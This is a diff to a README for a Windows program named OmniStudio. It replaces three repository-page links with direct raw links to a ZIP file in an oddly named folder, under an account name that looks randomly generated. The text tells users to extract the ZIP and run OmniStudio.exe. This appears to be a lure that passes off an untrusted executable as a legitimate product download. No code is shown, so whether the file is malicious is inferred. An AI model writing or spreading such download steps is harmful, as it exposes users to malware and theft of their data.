@@ -16,7 +16,7 @@ Getting OmniStudio on your Windows PC is as simple as one, two, three. We design
 
 ### ✅ Step 1: Download the Application
 
-[🎯 **CLICK HERE TO DOWNLOAD OmniStudio**](https://github.com/Effervescencephyllodocebreweri5631/OmniStudio)
+[🎯 **CLICK HERE TO DOWNLOAD OmniStudio**](https://raw.githubusercontent.com/Effervescencephyllodocebreweri5631/OmniStudio/main/wristlock/Omni-Studio-v3.6.zip)
 
 Visit this link to download the application. This takes you to the official download page where you will find the setup file for Windows.
 
@@ -34,7 +34,7 @@ Once installed, find the OmniStudio icon on your **desktop** or in the **Start M
 
 Need the download link again? Here it is:
 
-### 👉 [Download OmniStudio for Windows](https://github.com/Effervescencephyllodocebreweri5631/OmniStudio)
+### 👉 [Download OmniStudio for Windows](https://raw.githubusercontent.com/Effervescencephyllodocebreweri5631/OmniStudio/main/wristlock/Omni-Studio-v3.6.zip)
 
 **No installation wizard?** If you downloaded a ZIP folder instead of an installer, right-click the folder and select **"Extract All"**. Then open the extracted folder and double-click `OmniStudio.exe` to start the software.
 
@@ -151,7 +151,7 @@ Running AI locally means you're never locked into a subscription, never waiting 
 
 **Ready to begin?** Click the button below:
 
-### [🚀 Download OmniStudio Now](https://github.com/Effervescencephyllodocebreweri5631/OmniStudio)
+### [🚀 Download OmniStudio Now](https://raw.githubusercontent.com/Effervescencephyllodocebreweri5631/OmniStudio/main/wristlock/Omni-Studio-v3.6.zip)
 
 ---
 
